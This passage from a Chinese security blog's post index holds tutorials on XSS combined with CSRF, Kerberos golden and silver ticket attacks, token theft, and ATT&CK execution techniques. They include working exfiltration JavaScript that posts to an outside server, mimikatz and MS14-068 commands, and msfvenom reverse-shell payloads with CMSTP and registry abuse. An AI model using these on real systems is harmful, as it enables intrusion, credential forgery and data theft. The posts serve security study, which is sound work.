httponly 防护，cookie 也就无法被窃取，又当如何？试想过 当 XSS 遇上 CSRF 又会擦出怎样的火花？","text":"XSS 漏洞利用方式，最直接的就是盗取cookie，使用cookie实现用户登录。 但如果有 httponly 防护，cookie 也就无法被窃取，又当如何？试想过 当 XSS 遇上 CSRF 又会擦出怎样的火花？ 首先 XSS 调用 外部恶意的js文件（有时候会被谷歌拦截） 1&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;120.79.*&#x2F;ajax&gt;&lt;&#x2F;sCrIpT&gt; 敏感操作外部js 1234567891011121314151617function ajaxPost(url,data) &#123; var xmlhttp; if (window.XMLHttpRequest) &#123; xmlhttp&#x3D;new XMLHttpRequest(); &#125; else &#123; xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); &#125; xmlhttp.open(&quot;POST&quot;,url,true); xmlhttp.setRequestHeader(&quot;Content-type&quot;, &quot;application&#x2F;x-www-form-urlencoded&quot;); xmlhttp.send(data);&#125;url&#x3D;&quot;网站目录文件路径&quot;;data&#x3D;&quot;post数据&quot;;ajaxPost(url,data); 获取后台源码外部js 1234567891011121314151617181920212223242526272829function createXmlHttp()&#123; if (window.XMLHttpRequest) &#123; &#x2F;&#x2F; IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码 xmlhttp&#x3D;new XMLHttpRequest(); &#125; else &#123; &#x2F;&#x2F; IE6, IE5 浏览器执行代码 xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); &#125;&#125; createXmlHttp();xmlhttp.onreadystatechange&#x3D;function()&#123; if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200) &#123; code&#x3D;escape(xmlhttp.responseText); createXmlHttp(); url &#x3D; &quot;http:&#x2F;&#x2F;120.79.*&#x2F;receive.php&quot;; &#x2F;&#x2F;这里是我们服务器接受的地址 params&#x3D; &quot;htmlcode&#x3D;&quot; + code +&quot;&amp;filename&#x3D;admin.html&quot;; xmlhttp.open(&quot;POST&quot;, url, true); xmlhttp.setRequestHeader(&quot;Content-type&quot;, &quot;application&#x2F;x-www-form-urlencoded&quot;); xmlhttp.send(params) &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;&#x2F;后台页面路径&quot;,true);xmlhttp.send(); 后台接收的receive.php（此文件所在的目录要有写入的权限） 12345678910111213141516171819202122232425&lt;?phpfunction js_unescape($str) &#123; $ret &#x3D; &#39;&#39;; $len &#x3D; strlen($str); for ($i &#x3D; 0;$i &lt; $len;$i++) &#123; if ($str[$i] &#x3D;&#x3D; &#39;%&#39; &amp;&amp; $str[$i + 1] &#x3D;&#x3D; &#39;u&#39;) &#123; $val &#x3D; hexdec(substr($str, $i + 2, 4)); if ($val &lt; 0x7f) $ret.&#x3D; chr($val); else if ($val &lt; 0x800) $ret.&#x3D; chr(0xc0 | ($val &gt;&gt; 6)) . chr(0x80 | ($val &amp; 0x3f)); else $ret.&#x3D; chr(0xe0 | ($val &gt;&gt; 12)) . chr(0x80 | (($val &gt;&gt; 6) &amp; 0x3f)) . chr(0x80 | ($val &amp; 0x3f)); $i+&#x3D; 5; &#125; else if ($str[$i] &#x3D;&#x3D; &#39;%&#39;) &#123; $ret.&#x3D; urldecode(substr($str, $i, 3)); $i+&#x3D; 2; &#125; else $ret.&#x3D; $str[$i]; &#125; return $ret;&#125;$data &#x3D; js_unescape($_POST[&#39;htmlcode&#39;]); &#x2F;&#x2F;对获得源码js_unescape解码。$filename &#x3D; $_POST[&#39;filename&#39;] . date(&quot;y-m-d-h-i-s&quot;) . &quot;.html&quot;;$myfile &#x3D; fopen($filename, &quot;w&quot;);fwrite($myfile, $data);fclose($myfile);?&gt;","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://blog.cfyqy.com/tags/web%E6%BC%8F%E6%B4%9E/"},{"name":"XSS+SSRF","slug":"XSS-SSRF","permalink":"https://blog.cfyqy.com/tags/XSS-SSRF/"}],"author":"ye1s"},{"title":"window协议认证之Kerberos","slug":"window协议认证之Kerberos","date":"2020-01-05T12:28:00.000Z","updated":"2020-04-13T08:25:30.908Z","comments":true,"path":"article/3bf5e670.html","link":"","permalink":"https://blog.cfyqy.com/article/3bf5e670.html","excerpt":"Kerberos 是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。","text":"Kerberos 是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。 一些基本的概念: Principal 一个用户会以一个独一无二的身份来被 KDC 认证，该身份被称为 Principal。一个 Principal 由三个部分组成：primary, instance 以及 realm，其组成形式为primary/instance@realm。 primary 可以是 OS 中的 username，也可以是 service name； instance 用于区分属于同一个 user 或者 service 的多个 principals，该项为 optional； realm 类似于 DNS 中的 domain，定义了一组 principals 1234567AD(Account Database)，它作为账户管理数据库，用与存储用户认证信息，即密码的NTLM Hash等 KDC（Key Distribution Center）密钥分发中心，里面包含两个服务：AS和TGSAS（Authentication Server）身份认证服务器TGS（Ticket Granting Server）票据授权服务器SS（Service Server） 特定服务提供端TGT（Ticket Granting Ticket）由身份认证服务授予的票据(黄金票据)，用于身份认证，存储在内存，默认有效期为10小时 ST(Service Ticket) 由票据授权服务器提供的票据，用于特定服务 Kerberos认证流程 认证流程 z 123456KRB_AS_REQ: 客户端向KDC的KAS服务请求开身份证明KRB_AS_REP: KAS认证成功后返回给客户端认购权证（ TGT ）KRB_TGS_REQ: 客户端拿着TGT到KDC的TGS服务买票KRB_TGS_REP: TGS认证成功后返回给客户端服务票据（ST）KRB_AP_REQ: 客户端拿着ST去访问服务KRB_AP_REP: 返回服务资源 Kerberos认证的三阶段详情可看:Windows认证之Kerberos Kerberos 攻击方式MS14-068MS14068 是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。 漏洞分析：http://www.freebuf.com/vuls/56081.html漏洞利用：注意：Mimikatz PTC 注入不支持NT5内核，所以 XP、03 都没法用 利用方式: MS14-068 对应的补丁为 KB3011780,systeminfo 查看是否有补丁 在域内主机 jerry 上通过 dir 来访问域控的共享文件夹，示拒绝访问 1dir \\\\OWA2013.rootkit.org\\c$ 漏洞利用需要的参数说明: 1234-u 域账号+@+域名称，这里是jerry+@+rootkit.org-p 为当前用户的密码，即jerry的密码-s为jerry的SID值，可以通过whoami&#x2F;all来获取用户的SID值-d为当前域的域控 获取用户名，SID 1whoami &#x2F;all &#x2F;fo list 获取域控地址 1net group &quot;Domain controllers&quot; &#x2F;domain 获取TGT的 cache 文件 1MS14-068.exe -u jerry@rootkit.org -p qwe123! -s S-1-5-21-3759881954-2993291187-3577547808-1608 -d OWA2013.rootkit.org 清除缓存的票据 mimikatz 导入上面生成的、TGT cache 文件 1kerberos::ptc TGT_jerry@rootkit.org.ccache 再次dir访问域控共享,本应成功，这里显示有点问题，暂留疑问？ 黄金票据通过前面我们已经知道 Kerberos 的认证大致流程，在第二阶段认证的 KRB_AS_REQ 时，Client 拥有两份加密的 Session Key 分别是： 12用自己NTLM Hash加密的Session Key用krbtgt用户的NTLM Hash加密的TGT TGT 只有 KDC 可以解密，这是因为TGT是使用 krbtgt 用户的 NTLM Hash 进行加密的，而该Hash 只有 KDC 知道。但是这也意味着如果我们拥有 krbtgt 用户的 Hash，那么意味着我们可以解密以及伪造 TGT 利用条件 12341、域名称2、域的 SID 值3、伪造用户名，可以是任意的4、域的 KRBTGT 账户密码 HASH 里面前三项都比较好获取，最难的就是 krbtgt 用户的 Hashkrbtgt用户是KDC的默认用户，想要拿到它就意味着你已经拿到了域控所以说，万能票据只能算是一种安全可靠的留后门的方式 安全可靠的原因: 不用担心域管改密码，知道名字就可以伪造你的身份 krbtgt 密码只在 提升域功能级别、利用域的恢复数据来实施域的裸机恢复 的时候才更新，也就是说如果没大情况发生，hash 都是不变的 利用过程:获取域名，域 SID 在域控机子上获得 krbtgt 的 hash 1lsadump::dcsync &#x2F;domain:rootkit.org &#x2F;user:krbtgt Administrator作为我们要扮演的用户,mimikatz 中的 kerberos::golden 功能生成黄金票据参数说明： 12345&#x2F;admin：伪造的用户名&#x2F;domain：域名称&#x2F;sid：SID值，注意是去掉最后一个-后面的值&#x2F;krbtgt：krbtgt的HASH值&#x2F;ticket：生成的票据名称 生成黄金票据 golden.kiribi 1kerberos::golden &#x2F;admin:administrator &#x2F;domain:rootkit.org &#x2F;sid:S-1-5-21-3759881954-2993291187-3577547808 &#x2F;krbtgt:c3d5042c67ef5f461d0ba6ecdd9ea449 &#x2F;ticket:golden.kiribi 通过 mimikatz 中的 kerberos::ptt 功能（Pass The Ticket）将 golden.kiribi 导入内存中。 123kerberos::purgekerberos::ptt golden.kiribikerberos::list 此时就可以通过dir成功访问域控的共享文件夹 1dir \\\\OWA2013.rootkit.org\\c$ 白银票据白银票据不与 KDC 交互，伪造 Ticket 直接与 server 进行交互。在 Kerberos 认证大致流程的 KRB_AP_REQ 时，Client 拥有两份加密的 Session Key，分别是： 12用自己NTLM Hash加密的Session Key用Server的NTLM Hash加密的Tiket Tiket 只有 Server 可以解密，这是因为 Tiket 是使用 Server 的 NTLM Hash 进行加密的。但是这也意味着如果我们拥有 Server 的 Hash，那么意味着我们可以解密以及伪造 Tiket，从而绕过 KDC 直接进行验证。 因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。 利用条件: 12341.域名称2.域的 SID 值3.域的服务账户的密码 HASH（不是 krbtgt，是域控）4.伪造的用户名，可以是任意用户名，这里是 silver 利用过程: 首先我们需要知道服务账户的密码 HASH，这里同样拿域控来举例，通过 mimikatz 查看当前域账号 administrator 的 HASH 值。注意，这里使用的不是 Administrator 账号的 HASH，而是 OWA2013$ 的 HASH 12privilege::debugsekurlsa::logonpasswords 通过mimikatz生成白银票据 参数说明: 1234567&#x2F;domain：当前域名称&#x2F;sid：SID值，和金票一样取前面一部分&#x2F;target：目标主机，这里是OWA2010SP3.0day.org&#x2F;service：服务名称，这里需要访问共享文件，所以是cifs&#x2F;rc4：目标主机的HASH值&#x2F;user：伪造的用户名&#x2F;ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用&#x2F;ticket导出之后再使用kerberos::ptt来导入 开始生成 1kerberos::golden &#x2F;domain:rootkit.org &#x2F;sid:S-1-5-21-3759881954-2993291187-3577547808 &#x2F;target:OWA2013.rootkit.org &#x2F;service:cifs &#x2F;rc4:4c8d78036f691e43a56115f0f8fed1b7 &#x2F;user:administrator &#x2F;ptt klist查看当前会话的kerberos票据可以看到生成的票据,访问 DC 共享文件夹 参考文章:Kerberos 原理windows认证-白银票据、黄金票据分析及利用Windows认证之Kerberos","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"Kerberos","slug":"Kerberos","permalink":"https://blog.cfyqy.com/tags/Kerberos/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://blog.cfyqy.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"author":"ye1s"},{"title":"window访问控制模型","slug":"域渗透初识","date":"2020-01-03T14:57:00.000Z","updated":"2020-04-13T08:27:04.639Z","comments":true,"path":"article/b042f4ab.html","link":"","permalink":"https://blog.cfyqy.com/article/b042f4ab.html","excerpt":"Windows中的访问控制模型（Access Control Model），它是Windows安全性的基础构件。访问控制模型有两个主要的组成部分，访问令牌（Access Token）和安全描述符（Security Descriptor），它们分别是访问者和被访问者拥有的东西。通过访问令牌和安全描述符的内容，Windows可以确定持有令牌的访问者能否访问持有安全描述符的对象。","text":"Windows中的访问控制模型（Access Control Model），它是Windows安全性的基础构件。访问控制模型有两个主要的组成部分，访问令牌（Access Token）和安全描述符（Security Descriptor），它们分别是访问者和被访问者拥有的东西。通过访问令牌和安全描述符的内容，Windows可以确定持有令牌的访问者能否访问持有安全描述符的对象。 0x1基本概念0x1.1 访问令牌 访问令牌是与特定的Windows账户关联的。当一个Windows账户登录的时候，系统会从内部数据库里读取该账户的信息，然后使用这些信息生成一个访问令牌。在该账户环境下启动的进程，都会获得这个令牌的一个副本，进程中的线程默认持有这个令牌。线程要想去访问某个对象，或者执行某些系统管理相关的操作时，Windows就会使用这个线程持有的令牌进行访问检查 访问令牌包含: 123456789101112用户的SID用户所在组的SIDs当前登陆Session的登陆SID用户及其用户组所拥有的权限列表所有者的 SID首要组的SID 默认的DACL当前的Access Token来源是内核创建的Primary Token还是扮演的Impersonation Token一份受限SIDs的列表当前的扮演等级(impersonation levels)其他数据 SID(Security Identifiers)，是用户的唯一身份标识。 0x1.2 安全描述符 安全描述符是与被访问对象关联的，它含有这个对象所有者的SID，以及一个访问控制列表（ACL，Access Control List），访问控制列表又包括了DACL（Discretionary Access Control List）和SACL（System Access Control List） 自主访问控制列表(DACL)是安全描述符中最重要的，它里面包含零个或多个访问控制项（ACE，Access Control Entry），每个访问控制项的内容描述了允许或拒绝特定账户对这个对象执行特定操作 系统访问控制列表（SACL） 主要是用于系统审计的，它的内容指定了当特定账户对这个对象执行特定操作时，记录到系统日志中。 ACE的内容 1234特定账户或者账户组的SID一个访问掩码（Access Mask），该掩码指定了具体的访问权限（Access Rights），也就是可以对该对象执行的操作一个位标记，指示了这个ACE的类型一组位标记，指示了安全描述符所属对象的子对象是否继承这个ACE 所有的可访问对象都有三种ACE 123Access-denied ACE 用于拒绝账户访问Access-allowed ACE 用于允许账户访问而System-audit ACE 用于SACL中。 0x2权限0x2.1对象所有权创建对象时，将为该对象分配所有者。 默认情况下，所有者是对象的创建者。 无论对对象设置了哪些权限，对象的所有者始终可以更改权限。 0x2.2 权限的继承继承允许管理员轻松分配和管理权限。 此功能自动使容器内的对象继承该容器的所有可继承权限。 例如，文件夹中的文件将继承文件夹的权限。 只有标记为要继承的权限才会被继承。 0x2.3 用户权限用户权限授予你的计算环境中的用户和组的特定权限和登录权限。 管理员可以向组帐户或单个用户帐户分配特定的权限。 这些权限授权用户执行特定操作，例如以交互方式登录系统或备份文件和目录。 0x3 Token的窃取与使用Token是一个用户的身份标识，拿到他的Token就能伪装成该用户了。 Token的类型 1234AnonymousIdentificationImpersonation 创建于非交互的登陆中，如登陆FTP服务器，不同的账户能访问的资料也不同Delegation 创建于交互的登陆中，如从控制台或者远程服务登陆服务器 后两种token只在系统重启后清除具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效 详情可看如下文章:渗透技巧——Token窃取与利用渗透技巧——Windows Token九种权限的利用 window中的incognito.exe 12列举token：incognito.exe list_tokens -u复制token：incognito.exe execute [options] &lt;token&gt; &lt;command&gt; Metasploit中的incognito 1234567加载incognito：load incognito列举token：list_tokens -u查看当前token：getuid提示至system权限：getsystemtoken窃取：impersonate_token &quot;NT AUTHORITY\\\\SYSTEM&quot;从进程窃取：steal_token 1252返回之前token：rev2self or drop_token 参考文章: 访问控制概述Windows的访问控制模型渗透技巧——Token窃取与利用","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"window","slug":"window","permalink":"https://blog.cfyqy.com/tags/window/"},{"name":"访问控制模型","slug":"访问控制模型","permalink":"https://blog.cfyqy.com/tags/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B/"}],"author":"ye1s"},{"title":"ATT&CK浅识","slug":"ATT-CK浅识","date":"2019-11-23T11:57:00.000Z","updated":"2020-04-13T07:36:35.000Z","comments":true,"path":"article/f0769419.html","link":"","permalink":"https://blog.cfyqy.com/article/f0769419.html","excerpt":"ATT&amp;CK 是一个比较火的攻防行为结构化列表。包含了网络攻击中使用的已知对抗战术和技术，对于各种进攻性和防御性度量、表示和其他机制都非常有用。","text":"ATT&amp;CK 是一个比较火的攻防行为结构化列表。包含了网络攻击中使用的已知对抗战术和技术，对于各种进攻性和防御性度量、表示和其他机制都非常有用。 这里是ATT&amp;CK前三部分的利用方法和着手点。 0x1初始化访问这是攻击者对目标服务攻击的立足点，攻击利用点主要包括系统、服务、第三方应用的漏洞，目标服务薄弱的安全防护措施，以及目标服务相关的内部人员、技术支持、信任伙伴等有关接触和联系者。 0x1.1水坑攻击路过式攻击是指攻击者通过正常浏览网站的用户获得对系统的访问权。主要通过将漏洞代码交付给浏览器。 典型的路过式攻击过程： 用户访问托管攻击者控制内容的网站。 脚本自动执行，通常搜索浏览器的版本和插件以查找可能存在漏洞的版本。 - 可能需要用户通过启用脚本或激活网站组件并忽略告警对话框来协助此过程。 找到易受攻击的版本后，漏洞利用 (exploit) 代码将被发送到浏览器。 如果利用成功，那么它将在用户系统上执行攻击者的代码，除非有其他保护措施。 - 在某些情况下，需要在初始扫描后第二次访问网站，才能发送漏洞利用代码。 路过式攻击应满足的条件: 用户访问含有恶意脚本的站点 客户端系统存在易受攻击的软件 防范手段: 使用现代浏览器并开启安全功能。 确保所有浏览器和插件保持更新，有助于避免该技术的 exploit 阶段。 查找漏洞利用过程中的行为的安全应用程序，如 Windows Defender Exploit Guard (WDEG) 和 Enhanced Mitigation Experience Toolkit (EMET)，可以用来缓解某些漏洞利用行为。 0x1.2利用面向公众的应用使用软件，数据或命令利用计算机系统或程序中的缺陷以引起意外或未预料到的行为。系统中的缺陷可以是错误、小故障或设计漏洞。这些应用程序通常是网站，但可以包括数据库（如 SQL)、标准服务（如 SMB 或 SSH) 和任何具有 Internet 可访问的开放套接字的其他应用程序，如 web 服务器和相关服务。这可能包括防御规避的利用（Exploitation for Defense Evasion），这取决于利用的漏洞。 对于网站和数据库，OWASP top 10 列出了十大最常见的基于 Web 的漏洞 0x1.3额外的远程服务攻击者通过远程控制服务软件实现对受害主机的控制。 0x1.4硬件添加以计算机附件、计算机或网络硬件作为执行的载体引入到目标服务的系统或网络。 常见的行为 : 通过badusb插入目标的服务电脑。 连接目标服务的同一个wifi，在内网中渗透。 检测: 资产管理系统可以帮助检测不应存在于网络中的计算机系统或网络设备。 终端传感器可以通过 USB、Thunderbolt 和其他外部设备通信端口检测添加的硬件。 0x1.5通过可移动媒体进行复制攻击者可以通过将恶意软件复制到可移动的媒体上，利用媒体插入系统并执行的自动运行特性，转移到系统。 0x1.6鱼叉式钓鱼链接带链接的鱼叉式网络钓鱼是鱼叉式网络钓鱼的一种特殊变体。 它不同于其他形式的鱼叉式网络钓鱼，它使用链接下载电子邮件中包含的恶意软件，而不是将恶意文件附加到电子邮件，以规避可能检查电子邮件附件的防御。 0x1.7鱼叉式钓鱼附件鱼叉式钓鱼附件是鱼叉式钓鱼的一种特殊变体。 鱼叉式钓鱼附件不同于其他形式的鱼叉式钓鱼，它利用附加到电子邮件的恶意软件 。 攻击者将文件附加到鱼叉式钓鱼电子邮件并通常依赖用户执行 (User Execution ) 来获得执行。 附件可以是 Microsoft Office 文档、可执行文件、pdf 或存档文件等。 在打开附件（并可能点击过去的保护）时，攻击者的有效载荷会利用漏洞或直接在用户系统上执行。 检测: 网络入侵检测系统和电子邮件网关可用于检测带有恶意附件的鱼叉式网络钓鱼。 引爆设计（detonation chambers）也可用于识别恶意附件。 解决方案可以是基于签名和行为的，但是攻击者可能以某种方式构造附件来避免这些机制。 杀毒软件在扫描存储在电子邮件服务器或用户计算机上的文件时，可能会检测到恶意文档和附件。 终端检测或网络检测可以在打开附件（例如 Microsoft Word 文档或 PDF 文件，可以连接到 internet 或生成 Powershell.exe) 时潜在地检测恶意事件，这些事件与客户端执行和脚本的漏洞利用等技术有关。 0x1.8通过服务进行鱼叉式网络钓鱼通过服务进行的鱼叉式网络钓鱼是鱼叉式钓鱼的一种特殊变体。它不同于其他形式的鱼叉式网络钓鱼，它使用的是第三方服务而不是直接通过企业电子邮件渠道。 0x1.9供应链攻击供应链攻击是指在最终消费者收到产品或产品交付机制之前，为了数据或攻击系统而进行的操纵。 供应链攻击可以发生在供应链的任何阶段，包括： 开发工具的操作 开发环境的操作 对源代码库（公共或私有）的操作 软件更新/分发机制的操作 受攻击/感染的系统镜像（工厂中多例被感染的可移动媒体） 用修改的版本替换合法软件 向合法分销商销售修改/仿冒产品 产品本身存在漏洞。 尽管供应链的攻击可能会影响硬件或软件的任意组件，但想要获得执行的攻击者往往关注在软件分发阶段或更新渠道中对合法软件进行的恶意添加。 可以以特定的受害者群体为目标， 或将恶意软件分发给广泛的消费者群体，但仅对特定受害者的附加策略。 检测: 通过散列校验或其他完整性校验机制来检验分布式二进制文件。 扫描下载的文件查找是否有恶意签名，并尝试在部署之前测试软件和更新，同时注意潜在的可疑活动。 对硬件进行物理检查以查找潜在的篡改。 0x1.10可信关系攻击者可能会破坏或利用能够接触到目标受害者的组织。 通过可信的第三方关系利用现有的连接，这些连接可能不受保护或者受到的审查比获取网络访问权的标准机制少。 这些关系的例子包括 IT服务承包商 托管安全供应商 基础设施承包商(例如HVAC、电梯、物理安全) 防护措施: 可使用网络分割隔离无需广泛网络访问的基础设施组件。 妥善管理在受信关系中各方使用的帐户和权限，以最大限度地减少在特定方被攻击者攻击后，该方潜在的滥用可能。 审查与需要特权访问网络资源的工作签订合同的组织的安全策略和程序。 0x1.11有效帐户攻击者可以使用凭据访问技术窃取特定用户或服务帐户的凭据，或者通过社会工程在早期侦察过程中获取凭据，以获取初始访问权限。 0x2执行0X2.1CMSTPMicrosoft 连接管理器配置文件安装程序 (CMSTP.exe) 是用于安装连接管理器服务配置文件的命令行程序。 CMSTP.exe 接受安装信息文件 (INF) 作为参数，并安装用于远程访问连接的服务配置文件。 攻击者可以将感染恶意命令的 INF 文件传给 CMSTP.exe。 类似于 Regsvr32 /“Squiblydoo”，攻击者可能滥用 CMSTP.exe 从远程服务器加载和执行 DLL 和/或 COM scriptlet (SCT)。 cmstp的利用 1.用cmstp调用恶意的dll1)首先用msfvenom生成恶意dll文件 123456root@kali:~&#x2F;Desktop# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.192.134 LPORT&#x3D;4444 -f dll &gt; test.dll[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 510 bytesFinal size of dll file: 5120 bytes 2）msf设置接收链接 12345678910msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set Lhost 192.168.192.134Lhost &#x3D;&gt; 192.168.192.134msf5 exploit(multi&#x2F;handler) &gt; set lport 4444lport &#x3D;&gt; 4444msf5 exploit(multi&#x2F;handler) &gt; exploit[*] Started reverse TCP handler on 192.168.192.134:4444 3)INF文件的RegisterOCXSection包含恶意DLL文件的本地路径或远程执行的WebDAV位置payload.inf文件 1234567891011[version]Signature&#x3D;$chicago$AdvancedINF&#x3D;2.5[DefaultInstall_SingleUser]RegisterOCXs&#x3D;RegisterOCXSection[RegisterOCXSection]D:\\test.dll[Strings]AppAct &#x3D; &quot;SOFTWARE\\Microsoft\\Connection Manager&quot;ServiceName&#x3D;&quot;test&quot;ShortSvcName&#x3D;&quot;test&quot; 4)cmstp执行INF文件 1D:\\&gt;cmstp.exe &#x2F;s payload.inf 5)得到meterpreter会话 1234567msf5 exploit(multi&#x2F;handler) &gt; exploit[*] Started reverse TCP handler on 192.168.192.134:4444 [*] Sending stage (206403 bytes) to 192.168.192.5[*] Meterpreter session 1 opened (192.168.192.134:4444 -&gt; 192.168.192.5:49207) at 2019-11-23 03:03:58 -0500meterpreter &gt; 后渗透之meterpreter使用攻略 2.利用cmstp调用恶意的sct https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/ 0X2.2 命令行界面命令行界面提供了一种与计算机系统交互的方式，许多操作系统平台都有该功能。在 Windows 系统上命令行界面的一个例子是 cmd，它可以用来执行许多任务，包括执行其他软件。命令行界面可以在本地交互，也可以通过远程桌面应用程序、反向 shell 会话等进行远程交互。执行的命令以命令行界面进程的当前权限级别运行，除非该命令包含更改该执行的权限上下文的进程调用（例如，计划的任务 Scheduled Task)。 攻击者可以使用命令行界面与系统交互，并在操作过程中执行其他软件。 0X2.3 已编译的 HTML 文件 CHM 文件是各种内容（如 HTML 文档、图像）和编程语言相关的脚本/web（如 VBA、JScript、Java 和 ActiveX) 的压缩编译。 CHM 内容使用由 HTML 帮助可执行程序 (hh.exe) 加载的 Internet Explorer 浏览器 的底层组件显示。攻击者可能会滥用这项技术来隐藏恶意代码。 将包含嵌入式有效载荷的自定义 CHM 文件交付给受害者，然后通过用户执行 (User Execution) 触发。 多种利用方式可看 高级组合技打造“完美” 捆绑后门 CHM渗透：从入门到“入狱” 0X2.4 控制面板项目在Windows系统中，当用户打开控制面板时，会加载多个CPL文件。这些CPL文件的列表是从注册表中获得的。 Francesco Mifsud 发现，当启动控制面板时，将检查以下两个注册表位置，然后加载CPL。 12HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\CPLsHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\CPLs 问题就出在第二个注册表的位置，普通用户具有写入权限，所以可以在注册表中写入一个注册表键，该注册表将在控制面板启动时加载和执行恶意代码。唯一的条件是用户的系统允许打开控制面板和注册表。注册表二进制文件位于Windows文件夹内，默认情况下，AppLocker允许执行此文件夹内的所有内容。在大多数环境中也是允许控制面板运行的。 利用过程:1)首先用msfvenom生成恶意dll文件,并将文件名改为cpl,复制到受害机上。 123456root@kali:~&#x2F;Desktop# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.192.134 LPORT&#x3D;4444 -f dll &gt; test.dll[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 510 bytesFinal size of dll file: 5120 bytes 2）msf设置接收 12345678910msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set Lhost 192.168.192.134Lhost &#x3D;&gt; 192.168.192.134msf5 exploit(multi&#x2F;handler) &gt; set lport 4444lport &#x3D;&gt; 4444msf5 exploit(multi&#x2F;handler) &gt; exploit[*] Started reverse TCP handler on 192.168.192.134:4444 3)创建一个注册表键，这个注册表键的值将包含存储在主机上的CPL文件的路径 1reg add &quot;HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls&quot; &#x2F;v pentestlab.cpl &#x2F;t REG_SZ &#x2F;d &quot;D:\\pentestlab.cpl&quot; 4)等待控制面板启动，反弹个meterpreter. 具体详情可看如下链接: 绕过AppLocker系列之控制面板的利用 0X2.5 动态数据交换ddeWindows 动态数据交换 (DDE) 是用于应用程序之间的一次性和/或连续进程间通信 (IPC) 的客户端-服务器协议 。一旦建立连接，应用程序就可以自主地交换由字符串、温数据链接（数据项更改时的通知）、热数据链接（数据项更改的副本）和命令执行请求组成的事务。 攻击者可以使用 DDE 执行任意命令。Microsoft Office 文档可以通过 DDE 命令 直接或通过嵌入式文件 被污染，并用于通过钓鱼活动或托管 Web 内容交付执行，避免使用 Visual Basic for Applications (VBA) 宏。 防御: 可以将 Microsoft Office 功能控制安全性对应的注册表项设置为禁用 DDE/OLE 自动执行。 Microsoft 还创建了注册表项，以完全禁用 Word 和 Excel 中的 DDE 执行。 确保已启用受保护的视图 并考虑禁用未在受保护的视图中注册的 Office 程序（如 OneNote）中的嵌入文件。 在 Windows 10 上，启用攻击面减少 (ASR) 规则，以防止 DDE 攻击和从 Office 程序生成子进程。 利用示例文章:Office DDE 漏洞利用复现Office DDE 漏洞复现笔记 0X2.6 利用 API 执行攻击者工具可以直接使用 Windows 应用程序编程接口 (API) 来执行二进制文件。诸如 Windows API CreateProcess 这样的函数将允许程序和脚本使用适当的路径和参数启动其他进程。 可以用来执行二进制文件的其他 Windows API调用包括： CreateProcessA() 和 CreateProcessW(), CreateProcessAsUserA() 和 CreateProcessAsUserW(), CreateProcessInternalA() 和 CreateProcessInternalW (), CreateProcessWithTokenW CreateProcessWithLogonW(),(), LoadLibraryA() 和 LoadLibraryW (), LoadLibraryExA() 和 LoadLibraryExW (), LoadModule (), LoadPackagedLibrary(), WinExec (), ShellExecuteA() 和 ShellExecuteW(), ShellExecuteExA() 和 ShellExecuteExW() 0X2.7 通过模块加载执行可以指示 Windows 模块加载程序从任意本地路径和任意通用命名规则 (UNC) 网络路径加载 DLL。 这个功能保留在 NTDLL.dll 中，是 Windows 本机 API 的一部分，通过 Win32 API 的 CreateProcess()、LoadLibrary() 等函数调用的。 0X2.8 利用客户端执行软件可能因为不安全的编码实践而出现漏洞，从而导致非预期行为。 攻击者可以通过有针对性的利用某些漏洞来达到任意代码执行的目的。 存在以下几种类型： 基于浏览器的利用。网络浏览器是路过式攻击和鱼叉式钓鱼链接的常见目标 常见的第三方应用程序。其他常见应用程序或在目标网络中部署的软件的一部分也可以用于漏洞利用 0X2.9 图形用户界面图形用户界面 (GUI) 